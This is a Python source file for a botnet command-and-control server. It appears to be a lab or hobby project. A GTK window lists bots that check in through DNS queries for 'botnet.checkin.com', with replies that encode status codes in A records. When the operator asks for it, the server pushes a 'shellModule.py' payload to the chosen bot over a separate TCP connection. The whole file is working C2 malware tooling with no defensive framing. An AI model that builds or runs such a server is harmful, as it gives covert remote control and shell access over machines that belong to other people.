import gi
gi.require_version('Gtk', '3.0')
from gi.repository import Gtk, GLib

from datetime import datetime

##Add basic gui code

class Handler:
    def onDestroy(self, *args):
        Gtk.main_quit()

builder = Gtk.Builder()
builder.add_from_file("serverGui.glade")
builder.connect_signals(Handler())

logsBuffer = builder.get_object("logsBuffer")
iter = logsBuffer.get_start_iter()

currTime = datetime.now().strftime('%H:%M')


logsBuffer.insert(iter, "[" + currTime + "] Server Started, Listening for Client Connections\n")

botsTreeView = builder.get_object("botsTreeView")
botsListStore = Gtk.ListStore(str, str, str)
botsTreeView.set_model(botsListStore)

window = builder.get_object("mainWindow")
window.show_all()

##Add methods to update gui during server loop

def botCheckin():
    botsListStore.clear()
    for bot in botsDict.values():
        botsListStore.append([bot.ip, bot.lastTime, bot.status])
	
def addLog(log):
    iter = logsBuffer.get_start_iter()

    currTime = datetime.now().strftime('%H:%M')
    logsBuffer.insert(iter, "[" + currTime + "] " + log + "\n")	

    
##implement bot data structure and gui functions

class Bot:

    def __init__(self, ip):
        self.ip = ip
        self.lastTime = datetime.now().strftime('%H:%M')
        self.status = "none"

    def updateTime(self):
        self.lastTime = datetime.now().strftime('%H:%M')

botsDict = {}
selectedBot = "none"

def onSelectionChanged(tree_selection) :
    global selectedBot
    (model, pathlist) = tree_selection.get_selected_rows()

    if len(pathlist) != 0:
        tree_iter = model.get_iter(pathlist[0])
        value = model.get_value(tree_iter,0)
        selectedBot = str(value)

botsTreeView.get_selection().connect("changed", onSelectionChanged)

shellButton = builder.get_object("shellModuleButton")

def shellClicked(widget):
    global selectedBot
    if selectedBot in botsDict:
        botsDict[selectedBot].status = "Loading Shell Module"
    botCheckin()

shellButton.connect("clicked", shellClicked)

##implement main server code

import socketserver
from dnslib import DNSRecord, RR, QTYPE, A, TXT

import threading
import time
import socket

ServerAddress = ("192.168.48.137", 53)

class MyUDPRequestHandler(socketserver.DatagramRequestHandler):


    # Override the handle() method

    def handle(self):
        data = self.request[0].strip()
        try:
            dnsRequest = DNSRecord.parse(data)
        except:
            GLib.idle_add(addLog, "Packet from {}  is Invalid - Possibly a Dropped Packet".format(self.client_address[0]))

        client = self.request[1]


        if "botnet.checkin.com" in str(dnsRequest.questions[0]):
            #update gui and bots dictionary
            if self.client_address[0] not in botsDict:
                botsDict[self.client_address[0]] = Bot(self.client_address[0])
                dnsResponse = dnsRequest.reply()
                dnsResponse.add_answer(RR("botnet.checkin.com",QTYPE.A,rdata=A("67.79.79.76"),ttl=60))
                client.sendto(dnsResponse.pack(), self.client_address)
            elif botsDict[self.client_address[0]].status != "none":
                ## load module
                GLib.idle_add(addLog, "Loading Module for Bot at {}".format(self.client_address[0]))
                dnsResponse = dnsRequest.reply()
                dnsResponse.add_answer(RR("botnet.checkin.com",QTYPE.A,rdata=A("76.79.65.68"),ttl=60))

                #figure out free port to send module in
                s = socket.socket()
                s.bind(('', 0))            # Bind to a free port provided by the host.
                port = s.getsockname()[1]
                s.close()
                
                dnsResponse.add_answer(RR("botnet.checkin.com",QTYPE.TXT,rdata=TXT(str(port)),ttl=60))

                client.sendto(dnsResponse.pack(), self.client_address)

                #wait just a little bit to give client time to listen for connection, then send over module
                time.sleep(2)
                moduleBytes =  open("shellModule.py", "rb").read()
                modSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
                modAddr = (self.client_address[0], int(port))
                modSocket.connect(modAddr)
                modSocket.send(moduleBytes)
                modSocket.close()
                botsDict[self.client_address[0]].status = "none"
            else:
                dnsResponse = dnsRequest.reply()
                dnsResponse.add_answer(RR("botnet.checkin.com",QTYPE.A,rdata=A("67.79.79.76"),ttl=60))
                client.sendto(dnsResponse.pack(), self.client_address)

            botsDict[self.client_address[0]].updateTime()

            GLib.idle_add(botCheckin)
            GLib.idle_add(addLog, "Bot at {} Checked In".format(self.client_address[0]))
        else:
            GLib.idle_add(addLog, "{} Sent Non-Botnet Traffic: {}".format(self.client_address[0], dnsRequest))
	
# Create a Server Instance
def botnetServer():
     UDPServerObject = socketserver.ThreadingUDPServer(ServerAddress, MyUDPRequestHandler)
     UDPServerObject.serve_forever()


threading.Thread(target=botnetServer).start()
#start gui
Gtk.main()
